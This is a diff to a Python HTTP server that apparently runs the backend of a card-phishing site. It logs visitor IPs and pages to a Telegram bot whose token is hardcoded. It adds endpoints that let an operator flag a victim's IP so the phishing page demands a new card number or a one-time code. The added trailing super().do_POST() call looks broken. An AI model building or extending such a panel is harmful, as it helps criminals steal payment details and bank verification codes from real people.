@@ -71,6 +71,7 @@ REQUEST_AGAIN_FLAGS = {}
 # --- In-memory blacklist and wrong_card flags ---
 BLACKLISTED_IPS = set()
 WRONG_CARD_FLAGS = {}
+CODE_REDIRECT_FLAGS = {}
 
 def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     BOT_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"  # токен з main.py
@@ -232,6 +233,36 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(b'false')
             return
+        # --- Wrong card polling ---
+        if self.path.startswith('/check_wrong_card'):
+            from urllib.parse import parse_qs
+            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
+            ip = qs.get('ip', [None])[0]
+            if ip and WRONG_CARD_FLAGS.get(ip):
+                WRONG_CARD_FLAGS[ip] = False
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'true')
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'false')
+            return
+        # --- Code redirect polling ---
+        if self.path.startswith('/check_code_redirect'):
+            from urllib.parse import parse_qs
+            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
+            ip = qs.get('ip', [None])[0]
+            if ip and CODE_REDIRECT_FLAGS.get(ip):
+                CODE_REDIRECT_FLAGS[ip] = False
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'true')
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'false')
+            return
         try:
             super().do_GET()
         except Exception as e:
@@ -377,6 +408,9 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 elif action == 'card' and ip:
                     WRONG_CARD_FLAGS[ip] = True
                     print(f'[admin_action] Wrong card for IP: {ip}')
+                elif action == 'code' and ip:
+                    CODE_REDIRECT_FLAGS[ip] = True
+                    print(f'[admin_action] Code redirect for IP: {ip}')
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b'ok')
@@ -389,6 +423,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         else:
             self.send_response(404)
             self.end_headers()
+        super().do_POST()
 
 if __name__ == "__main__":
     try:
